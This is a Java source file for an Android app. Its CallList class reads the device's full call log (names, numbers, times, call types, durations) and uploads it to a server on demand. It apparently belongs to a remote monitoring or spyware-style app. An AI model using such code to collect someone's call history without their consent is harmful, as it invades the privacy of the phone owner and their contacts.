package com.inet.android.list;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

import com.inet.android.bs.NetworkChangeReceiver;
import com.inet.android.request.AppConstants;
import com.inet.android.request.RequestList;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.CallLog;

/**
 * ListCall class is designed to get the list of call
 * 
 * @author johny homicide
 * 
 */
public class CallList extends AsyncTask<Context, Void, Void> {
	private Context mContext;
	private String LOG_TAG = CallList.class.getSimpleName().toString();
	private String complete;
	private int version;

	private String readCallLogs() {

		int type = -1;
		version = AppSettings.getSetting(AppConstants.TYPE_LIST_CALL, mContext);
		Logging.doLog(LOG_TAG, "readCall" + version, "readCall" + version);

		if (NetworkChangeReceiver.isOnline(mContext) != 0) {

			Cursor callLogCursor = null;
			// Делаем запрос к контент-провайдеру
			// и получаем все данные из таблицы

			complete = "0";
			callLogCursor = mContext.getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null, null,
					null, android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
			Set<Map<String, String>> listOfMapsForData = new HashSet<Map<String, String>>();

			if (callLogCursor != null) {
				// Проходим в цикле, пока не дойдём до последней записи

				while (callLogCursor.moveToNext()) {

					// Имя контакта
					String name = callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.CACHED_NAME));

					String cacheNumber = callLogCursor
							.getString(callLogCursor.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
					// Номер контакта и т.д.
					String number = callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.NUMBER));
					// String name = getNumber.getContactName(callLogCursor
					// .getString(callLogCursor
					// .getColumnIndex("address")))
					long dateTimeMillis = callLogCursor.getLong(callLogCursor.getColumnIndex(CallLog.Calls.DATE));
					// long durationMillis = callLogCursor.getLong(callLogCursor
					// .getColumnIndex(CallLog.Calls.DURATION));
					int callType = callLogCursor.getInt(callLogCursor.getColumnIndex(CallLog.Calls.TYPE));
					int durationInt = callLogCursor.getColumnIndex(CallLog.Calls.DURATION);
					String duration = callLogCursor.getString(durationInt);

					String dateString = ConvertDate.getDate(dateTimeMillis);

					if (cacheNumber == null)
						cacheNumber = number;
					if (name == null)
						name = "No Name";
					if (callType == CallLog.Calls.OUTGOING_TYPE) {
						type = AppConstants.TYPE_OUTGOING_CALL_REQUEST;
					} else if (callType == CallLog.Calls.INCOMING_TYPE) {
						type = AppConstants.TYPE_INCOMING_CALL_REQUEST;
					} else if (callType == CallLog.Calls.MISSED_TYPE) {
						type = AppConstants.TYPE_MISSED_CALL_REQUEST;
					}
					Map<String, String> data = new HashMap<String, String>();
					data.put("time", dateString);
					data.put("name", name);
					data.put("number", number);
					data.put("type", Integer.toString(type));
					if (type == 3)
						data.put("duration", duration);
					listOfMapsForData.add(data);

				}
				Logging.doLog(LOG_TAG, "callLogCursor.close()", "callLogCursor.close()");
				callLogCursor.close();
				if (listOfMapsForData.isEmpty() != true) {
					sendRequest(listOfMapsForData);
					listOfMapsForData = null;
				}
			} else
				sendRequest("");
		} else
			endList();

		return null;
	}

	private void endList() {
		Logging.doLog(LOG_TAG, "endList ", "endList " + version);
		Queue.setList(AppConstants.TYPE_LIST_CALL, version, "0", mContext);
	}

	private void sendRequest(Object request) {
		complete = "1";
		Logging.doLog(LOG_TAG, "Send complete 1 .." + version, "Send complete 1 .." + version);
		RequestList.sendDemandRequest(request, AppConstants.TYPE_LIST_CALL_REQUEST, complete, version, mContext);
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Автоматически созданная заглушка метода
		Logging.doLog(LOG_TAG, "doIn");
		this.mContext = params[0];
		readCallLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}
